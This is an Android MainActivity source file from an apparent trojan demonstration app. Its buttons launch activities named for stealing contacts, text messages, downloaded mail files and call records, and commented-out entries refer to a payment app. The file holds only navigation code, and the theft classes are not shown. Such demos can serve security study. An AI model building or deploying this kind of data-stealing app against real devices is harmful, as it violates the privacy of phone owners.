package com.singuloid.trojandemo;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;


public class MainActivity extends Activity implements View.OnClickListener {

    private static final String TAG = "MainActivity";
    private Button mContacts, mContacts2, mText, mText2, mMail, mCallRecords, mZhifubao, mNotepad;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
    }

    private void initView() {
        mContacts = (Button) findViewById(R.id.contacts);
        mContacts2 = (Button) findViewById(R.id.contacts2);
        mText = (Button) findViewById(R.id.text);
        mText2 = (Button) findViewById(R.id.text2);
        mMail = (Button) findViewById(R.id.mail);
        mCallRecords = (Button) findViewById(R.id.call_records);
//        mZhifubao = (Button) findViewById(R.id.zhifubao);
//        mNotepad = (Button) findViewById(R.id.notepad);
        mContacts.setOnClickListener(this);
        mContacts2.setOnClickListener(this);
        mText.setOnClickListener(this);
        mText2.setOnClickListener(this);
        mMail.setOnClickListener(this);
        mCallRecords.setOnClickListener(this);
//        mZhifubao.setOnClickListener(this);
//        mNotepad.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {
        Intent textIntent = new Intent(this, FilchText.class);
        switch (v.getId()) {
            case R.id.contacts:
                startActivity(new Intent(this, FilchContacts.class));
                break;
            case R.id.contacts2:
                startActivity(new Intent(this, FilchContacts.class));
                break;
            case R.id.text:
                textIntent.putExtra("isWorkPhone", false);
                startActivity(textIntent);
                break;
            case R.id.text2:
                textIntent.putExtra("isWorkPhone", true);
                startActivity(textIntent);
                break;
            case R.id.mail:
                startActivity(new Intent(this, FilchDownloadFiles.class));
                break;
            case R.id.call_records:
                startActivity(new Intent(this, FilchCallRecords.class));
                break;
//            case R.id.zhifubao:
//
//                break;
//            case R.id.notepad:
//
//                break;
        }
    }
}
